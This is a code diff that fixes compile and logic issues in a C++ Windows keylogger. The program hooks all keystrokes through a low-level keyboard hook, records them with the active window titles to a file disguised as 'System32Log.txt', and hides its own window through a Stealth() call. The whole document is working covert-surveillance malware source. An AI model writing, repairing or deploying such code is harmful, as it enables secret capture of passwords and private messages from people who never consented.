@@ -19,8 +19,6 @@ KBDLLHOOKSTRUCT kbdStruct;
 int Save(int key_stroke);
 std::ofstream OUTPUT_FILE;
 
-extern char lastwindow[256];
-
 // This is the callback function. Consider it the event that is raised when, in this case, 
 // a key is pressed.
 LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
@@ -50,7 +48,9 @@ void SetHook()
 	// function that sets and releases the hook.
 	if (!(_hook = SetWindowsHookEx(WH_KEYBOARD_LL, HookCallback, NULL, 0)))
 	{
-		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
+		LPCWSTR a = L"Failed to install hook!";
+		LPCWSTR b = L"Error";
+		MessageBox(NULL, a, b, MB_ICONERROR);
 	}
 }
 
@@ -61,14 +61,14 @@ void ReleaseHook()
 
 int Save(int key_stroke)
 {
-    char lastwindow[256];
+	static char lastwindow[256] = "";
     
 	if ((key_stroke == 1) || (key_stroke == 2))
 		return 0; // ignore mouse clicks
 	
 	HWND foreground = GetForegroundWindow();
     DWORD threadID;
-    HKL layout;
+    HKL layout = NULL;
     if (foreground) {
         //get keyboard layout of the thread
         threadID = GetWindowThreadProcessId(foreground, NULL);
@@ -77,8 +77,8 @@ int Save(int key_stroke)
 
     if (foreground)
     {
-        char window_title[256];
-        GetWindowText(foreground, window_title, 256);
+		char window_title[256];
+        GetWindowTextA(foreground,(LPSTR)window_title, 256);
         
         if(strcmp(window_title, lastwindow)!=0) {
             strcpy(lastwindow, window_title);
@@ -145,6 +145,7 @@ int Save(int key_stroke)
         if (!lowercase) key = tolower(key);
 		OUTPUT_FILE <<  char(key);
     }
+	
 	//instead of opening and closing file handlers every time, keep file open and flush.
     OUTPUT_FILE.flush();
 	return 0;
@@ -165,7 +166,6 @@ int main()
 {
 	//open output file in append mode
     OUTPUT_FILE.open("System32Log.txt",std::ios_base::app);	
-
 	// visibility of window
 	Stealth();
 
